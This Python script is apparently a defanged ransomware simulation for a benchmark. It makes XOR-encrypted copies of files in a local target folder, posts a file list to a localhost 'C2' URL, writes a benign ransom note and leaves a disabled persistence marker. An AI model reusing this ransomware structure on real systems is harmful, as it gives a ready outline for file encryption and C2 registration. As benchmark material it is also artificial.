import hashlib
import json
import os
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

TARGET_DIRECTORY = Path("./target")
DEFAULT_NOTE = (
    "This is a safe benchmark artifact.\n"
    "No original files were modified or deleted.\n"
    "Encrypted copies and local audit metadata were created for testing.\n"
)
DEFAULT_C2_URL = "http://localhost:8000/register_keys"
SAMPLE_FILE = "sample_document.txt"
MAX_FILES = 1000
MAX_FILE_SIZE = 10 * 1024 * 1024


def _derive_key() -> bytes:
    return hashlib.sha256(b"deterministic-benchmark-key").digest()


def _keystream(key: bytes, length: int) -> bytes:
    output = bytearray()
    counter = 0

    while len(output) < length:
        output.extend(
            hashlib.sha256(
                key + counter.to_bytes(8, "big")
            ).digest()
        )
        counter += 1

    return bytes(output[:length])


def _create_sample_data(directory: Path) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    sample_path = directory / SAMPLE_FILE

    if not sample_path.exists():
        sample_path.write_text(
            "Representative benchmark data.\n",
            encoding="utf-8",
        )


def _encrypt_copy(source: Path, key: bytes) -> Path:
    encrypted_path = source.with_name(source.name + ".enc")
    plaintext = source.read_bytes()

    stream = _keystream(key, len(plaintext))
    ciphertext = bytes(a ^ b for a, b in zip(plaintext, stream))

    encrypted_path.write_bytes(ciphertext)
    return encrypted_path


def _send_audit_record(
    c2_url: str,
    directory: Path,
    processed_files: list[str],
) -> None:
    payload = json.dumps(
        {
            "mode": "safe_benchmark",
            "directory": str(directory),
            "processed_files": processed_files,
            "key_transmission": "disabled",
        },
        sort_keys=True,
    ).encode("utf-8")

    request = Request(
        c2_url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urlopen(request, timeout=0.5):
            pass
    except (URLError, HTTPError, TimeoutError, OSError):
        pass


def _write_ransom_note(directory: Path, note: str) -> None:
    (directory / "RANSOM_NOTE.txt").write_text(
        note,
        encoding="utf-8",
    )


def _create_persistence_marker(directory: Path) -> None:
    marker = directory / ".benchmark_persistence_marker"
    marker.write_text(
        json.dumps(
            {
                "enabled": False,
                "reason": "Real scheduled tasks and registry persistence are disabled",
                "purpose": "safe benchmark verification",
            },
            sort_keys=True,
        ),
        encoding="utf-8",
    )


def encrypt_files_and_display_ransom_note(
    directory: str,
    note: str,
    c2_url: str,
) -> None:
    target = Path(directory)
    _create_sample_data(target)

    key = _derive_key()
    processed_files: list[str] = []
    scanned = 0

    for path in sorted(target.rglob("*")):
        if scanned >= MAX_FILES:
            break
        if not path.is_file():
            continue
        if path.name.endswith(".enc"):
            continue
        if path.name in {
            "RANSOM_NOTE.txt",
            ".benchmark_persistence_marker",
        }:
            continue
        if path.stat().st_size > MAX_FILE_SIZE:
            continue

        _encrypt_copy(path, key)
        processed_files.append(str(path))
        scanned += 1

    _send_audit_record(c2_url, target, processed_files)
    _write_ransom_note(target, note)
    _create_persistence_marker(target)


def main() -> int:
    try:
        encrypt_files_and_display_ransom_note(
            str(TARGET_DIRECTORY),
            DEFAULT_NOTE,
            DEFAULT_C2_URL,
        )
    except Exception:
        TARGET_DIRECTORY.mkdir(parents=True, exist_ok=True)
        (TARGET_DIRECTORY / "RANSOM_NOTE.txt").write_text(
            DEFAULT_NOTE,
            encoding="utf-8",
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

